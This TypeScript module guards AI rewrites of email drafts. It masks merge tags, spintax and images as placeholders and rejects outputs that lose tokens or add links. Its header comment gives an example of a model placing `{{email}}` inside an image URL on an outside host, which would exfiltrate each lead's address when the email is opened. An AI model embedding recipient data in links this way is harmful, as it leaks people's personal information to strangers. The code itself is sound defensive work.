/**
 * AI on the draft: what the composer's rewrite actions are, and the guard that keeps a rewrite from
 * breaking the template or reaching outside the draft.
 *
 * A draft carries syntax the renderer fills in per lead: `{{firstName|there}}`, `{{ai.icebreaker}}`,
 * spintax `{Hi|Hello}`, `{{#if title}}...{{/if}}` blocks, and images (sometimes a large inline data
 * URI). A model asked to "make it friendlier" is free to translate `{{firstName}}`, merge two spintax
 * options, or drop the block it does not understand, and the email would then go out to every lead
 * with a gap or with literal braces in it. So the model never sees them:
 *
 *  1. `protectTokens` replaces each one by a numbered placeholder (`[[T1]]`, `[[T2]]`, ...). A
 *     conditional block goes whole, its text included: what it says depends on the lead, and a
 *     rewrite cannot know which branch a reader sees.
 *  2. `validateRewrite` strips any image the model wrote (the originals are placeholders, so they
 *     come back untouched), refuses an answer that dropped, repeated or invented a placeholder or
 *     wrote template syntax of its own, then reads the links and image addresses from the parsed,
 *     sanitised result: each must be one the draft already had. A model that moves `{{email}}` into
 *     `<img src="https://x/?e=...">` or a new link would otherwise send every lead's address to a
 *     stranger the moment the email is opened.
 *
 * Every scan here is linear: the request body is attacker-sized, and the first version spent 5.6 s
 * on 60 KB of `{a`.
 *
 * Pure, client and server.
 */
import { isHtml } from '@/lib/email/sanitize';
import { plainTextToHtml, sanitizeComposeDetailed, stripImages } from './html';

export const REWRITE_ACTIONS = [
  { id: 'shorten', label: 'Shorten' },
  { id: 'friendlier', label: 'Make friendlier' },
  { id: 'formal', label: 'Make more formal' },
  { id: 'grammar', label: 'Fix grammar and spelling' },
  { id: 'translate_vi', label: 'Translate to Vietnamese' },
  { id: 'translate_en', label: 'Translate to English' },
  { id: 'custom', label: 'Rewrite with my instruction' },
] as const;

export type RewriteActionId = (typeof REWRITE_ACTIONS)[number]['id'];
export const REWRITE_ACTION_IDS = REWRITE_ACTIONS.map((a) => a.id) as [RewriteActionId, ...RewriteActionId[]];

/** The draft as sent, images included. */
export const MAX_REWRITE_INPUT_CHARS = 60_000;
/** What the model is given once tokens and images are placeholders: about 1,500 words. */
export const MAX_REWRITE_TEXT_CHARS = 10_000;
export const MAX_REWRITE_INSTRUCTION_CHARS = 300;
/** More template syntax or images than any real email has: refused before anything is parsed. */
export const MAX_REWRITE_BRACES = 2_000;
export const MAX_REWRITE_IMAGES = 100;

export interface ProtectedText {
  masked: string;
  /** The original text of placeholder `[[T{i+1}]]`. */
  tokens: string[];
}

const placeholder = (index: number) => `[[T${index + 1}]]`;
const PLACEHOLDER_RE = /\[\[T(\d+)\]\]/g;
const CONDITIONAL_TAG_RE = /\{\{\s{0,20}(#if\b[^}]{0,300}|\/if\s{0,20})\}\}/g;
const CONDITIONAL_OPEN_RE = /^\{\{\s{0,20}#if\b/;

/** A cheap count, run before any scanning: why this draft cannot be rewritten, or null. */
export function rewriteInputProblem(text: string): string | null {
  let braces = 0;
  for (let i = 0; i < text.length; i++) if (text.charCodeAt(i) === 123 /* { */) braces++;
  if (braces > MAX_REWRITE_BRACES) return 'This draft has more template syntax than can be rewritten safely. Rewrite it in parts.';
  if ((text.match(/<img\b/gi) ?? []).length > MAX_REWRITE_IMAGES) return 'This draft has too many images to rewrite.';
  return null;
}

interface TemplateScan {
  /** End of the `{{...}}` tag at `i` (index after `}}`), or -1 when it never closes. */
  tagEnd(i: number): number;
  /** End of the `{{#if}}` block at `i`, nested blocks followed, or -1 when it never closes. */
  conditionalEnd(i: number): number;
  /** End of the spintax group at `i` (a `{` with a `|` at its own level), or -1. */
  spintaxEnd(i: number): number;
}

/**
 * Everything the tokenizer asks about, computed in single passes up front. Asking "where does this
 * close" again from every brace is what made the first version quadratic.
 */
function scanTemplate(text: string): TemplateScan {
  const n = text.length;
  const nextClose = new Int32Array(n + 2).fill(-1);
  for (let i = n - 2; i >= 0; i--) nextClose[i] = text[i] === '}' && text[i + 1] === '}' ? i : nextClose[i + 1];
  const tagEnd = (i: number) => {
    const close = i + 2 <= n ? nextClose[i + 2] : -1;
    return close === -1 ? -1 : close + 2;
  };

  const conditionals = new Map<number, number>();
  const opens: number[] = [];
  for (const m of text.matchAll(CONDITIONAL_TAG_RE)) {
    if (m[1].startsWith('#')) opens.push(m.index);
    else if (opens.length > 0) conditionals.set(opens.pop()!, m.index + m[0].length);
  }

  const spintax = new Map<number, number>();
  const groups: Array<{ at: number; options: boolean }> = [];
  for (let j = 0; j < n; j++) {
    const ch = text[j];
    if (ch === '{' && text[j + 1] === '{') {
      const end = tagEnd(j);
      // A `{{` that never closes cannot sit inside a group, and the groups open around it never close.
      if (end === -1) { groups.length = 0; continue; }
      j = end - 1;
    } else if (ch === '{') groups.push({ at: j, options: false });
    else if (ch === '}') {
      const group = groups.pop();
      if (group?.options) spintax.set(group.at, j + 1);
    } else if (ch === '|' && groups.length > 0) groups[groups.length - 1].options = true;
  }

  return {
    tagEnd,
    conditionalEnd: (i) => conditionals.get(i) ?? -1,
    spintaxEnd: (i) => spintax.get(i) ?? -1,
  };
}

/**
 * End of the `<img ...>` tag at `i`, or -1. A `>` inside a quoted attribute (`alt="a>b"`) does not
 * end it. The scan stops at the next `<`, which a serialised attribute never contains unescaped, so
 * scans from successive `<img` never overlap and the whole pass stays linear.
 */
function imageEnd(text: string, i: number): number {
  let quote: string | null = null;
  for (let j = i + 4; j < text.length; j++) {
    const ch = text[j];
    if (ch === '<') return -1;
    if (quote) { if (ch === quote) quote = null; continue; }
    if (ch === '"' || ch === "'") quote = ch;
    else if (ch === '>') return j + 1;
  }
  return -1;
}

/** The length of the token that starts at `i`, or 0 when ordinary text starts there. */
function tokenAt(text: string, i: number, scan: TemplateScan): number {
  const ch = text[i];
  if (ch === '<') {
    if (!/^<img\b/i.test(text.slice(i, i + 5))) return 0;
    const end = imageEnd(text, i);
    return end === -1 ? 0 : end - i;
  }
  if (ch === '[') {
    const m = /^\[\[T\d{1,6}\]\]/.exec(text.slice(i, i + 12));
    return m ? m[0].length : 0;
  }
  if (ch === '{' && text[i + 1] === '{') {
    const block = CONDITIONAL_OPEN_RE.test(text.slice(i, i + 30)) ? scan.conditionalEnd(i) : -1;
    const end = block !== -1 ? block : scan.tagEnd(i);
    return end === -1 ? 0 : end - i;
  }
  if (ch === '{') {
    const end = scan.spintaxEnd(i);
    return end === -1 ? 0 : end - i;
  }
  return 0;
}

/** Replace every template token, image and placeholder-shaped text with a numbered placeholder. */
export function protectTokens(text: string): ProtectedText {
  const scan = scanTemplate(text);
  const tokens: string[] = [];
  const parts: string[] = [];
  let plainFrom = 0;
  let i = 0;
  while (i < text.length) {
    const ch = text[i];
    const length = ch === '<' || ch === '{' || ch === '[' ? tokenAt(text, i, scan) : 0;
    if (length > 0) {
      parts.push(text.slice(plainFrom, i), placeholder(tokens.length));
      tokens.push(text.slice(i, i + length));
      i += length;
      plainFrom = i;
    } else {
      i++;
    }
  }
  parts.push(text.slice(plainFrom));
  return { masked: parts.join(''), tokens };
}

export type RewriteRefusal =
  | 'dropped' | 'duplicated' | 'invented' | 'added_syntax' | 'link_changed' | 'token_in_link' | 'images_changed' | 'variables_changed';
export type RestoreResult = { ok: true; text: string } | { ok: false; reason: RewriteRefusal; message: string };

const braces = (text: string) => (text.match(/[{}]/g) ?? []).length;
const preview = (tokens: string[]) => {
  const shown = tokens.slice(0, 3).map((t) => (t.length > 40 ? `${t.slice(0, 37)}...` : t));
  return `${shown.join(', ')}${tokens.length > 3 ? ` and ${tokens.length - 3} more` : ''}`;
};

/** Put the original tokens back, refusing an answer that lost, repeated or made up any of them. */
export function restoreTokens(output: string, original: ProtectedText): RestoreResult {
  const seen = new Map<number, number>();
  for (const m of output.matchAll(PLACEHOLDER_RE)) {
    const index = Number(m[1]) - 1;
    seen.set(index, (seen.get(index) ?? 0) + 1);
  }
  if ([...seen.keys()].some((index) => index < 0 || index >= original.tokens.length)) {
    return { ok: false, reason: 'invented', message: 'The rewrite added template content that was not in your draft. Nothing was changed.' };
  }
  const dropped = original.tokens.filter((_, index) => !seen.has(index));
  if (dropped.length > 0) {
    return {
      ok: false,
      reason: 'dropped',
      message: `The rewrite lost ${preview(dropped)} from your draft, so it was not used. Try again or edit by hand.`,
    };
  }
  const repeated = original.tokens.filter((_, index) => (seen.get(index) ?? 0) > 1);
  if (repeated.length > 0) {
    return { ok: false, reason: 'duplicated', message: `The rewrite repeated ${preview(repeated)}, so it was not used. Try again.` };
  }
  if (braces(output) > braces(original.masked)) {
    return {
      ok: false,
      reason: 'added_syntax',
      message: 'The rewrite added variables or spintax of its own, so it was not used. Insert variables yourself with {{.',
    };
  }
  return { ok: true, text: output.replace(PLACEHOLDER_RE, (_whole, n: string) => original.tokens[Number(n) - 1]) };
}

/** Template syntax, or a placeholder, inside an address: how a lead's data would leave in a URL. */
const ADDRESS_TOKEN = /\{\{|\[\[T\d|\{[^{}]{0,300}\|/;
const LINK_CHANGED: RestoreResult = { ok: false, reason: 'link_changed', message: 'The rewrite added or changed a link or image address, so it was not used. Try again.' };
const TOKEN_IN_LINK: RestoreResult = {
  ok: false, reason: 'token_in_link',
  message: 'The rewrite put one of your variables inside a link or image address, so it was not used. Try again.',
};

/** The first address in `found` the draft did not have, judged as a refusal; null when all are known. */
function unknownAddress(found: string[], known: Set<string>): RestoreResult | null {
  const unknown = found.find((address) => !known.has(address));
  if (unknown === undefined) return null;
  return ADDRESS_TOKEN.test(unknown) ? TOKEN_IN_LINK : LINK_CHANGED;
}

const TRAILING_PUNCTUATION = '.,;:!?)]}\'"';

/** Web addresses written as text, trailing punctuation off. */
function bareUrls(text: string): string[] {
  return (text.match(/\b(?:https?:\/\/|www\.)[^\s<>"']+/gi) ?? []).map((url) => {
    let end = url.length;
    while (end > 0 && TRAILING_PUNCTUATION.includes(url[end - 1])) end--;
    return url.slice(0, end);
  });
}

/**
 * The checks a rewrite passes before the rep sees it. For an HTML draft the text returned is the
 * sanitised HTML whose links were inspected, so nothing can change between the check and the use.
 * Dropping a link is allowed (a shorter email may lose one); adding or changing one is not.
 */
export function validateRewrite(input: string, original: ProtectedText, output: string, draftIsHtml = isHtml(input)): RestoreResult {
  if (!draftIsHtml) {
    const restored = restoreTokens(output, original);
    if (!restored.ok) return restored;
    return unknownAddress(bareUrls(restored.text), new Set(bareUrls(input))) ?? restored;
  }

  // Any image in the answer is the model's own: the draft's images are placeholders until now.
  const restored = restoreTokens(stripImages(output), original);
  if (!restored.ok) return restored;
  const result = sanitizeComposeDetailed(restored.text);
  const draft = sanitizeComposeDetailed(input);
  const refused =
    unknownAddress(result.hrefs, new Set(draft.hrefs)) ??
    unknownAddress(result.srcs, new Set(draft.srcs)) ??
    unknownAddress(bareUrls(result.html.replace(/<[^<>]{0,4000}>/g, ' ')), new Set([...draft.hrefs, ...bareUrls(input)]));
  if (refused) return refused;
  if (result.images !== draft.images) {
    return { ok: false, reason: 'images_changed', message: 'The rewrite lost or changed an image in your draft, so it was not used. Try again.' };
  }
  return { ok: true, text: result.html };
}

/** Every merge tag, conditional tag and spintax group in `text`, as written: what must survive a rewrite. */
export function templateTokens(text: string): string[] {
  const scan = scanTemplate(text);
  const out: string[] = [];
  for (let i = 0; i < text.length; i++) {
    if (text[i] !== '{') continue;
    if (text[i + 1] === '{') {
      const end = scan.tagEnd(i);
      if (end === -1) break;
      out.push(text.slice(i, end));
      i = end - 1;
    } else {
      const end = scan.spintaxEnd(i);
      if (end !== -1) {
        out.push(text.slice(i, end));
        i = end - 1;
      }
    }
  }
  return out;
}

/** Same tokens, same number of times, in any order. */
export function sameTemplateTokens(a: string, b: string): boolean {
  const x = templateTokens(a).sort();
  const y = templateTokens(b).sort();
  return x.length === y.length && x.every((token, i) => token === y[i]);
}

/** The rewrite added under the draft rather than replacing it. */
export function insertBelow(body: string, addition: string): string {
  if (!body.trim()) return addition;
  if (isHtml(body)) return `${body}${isHtml(addition) ? addition : plainTextToHtml(addition)}`;
  return `${body.trimEnd()}\n\n${addition}`;
}
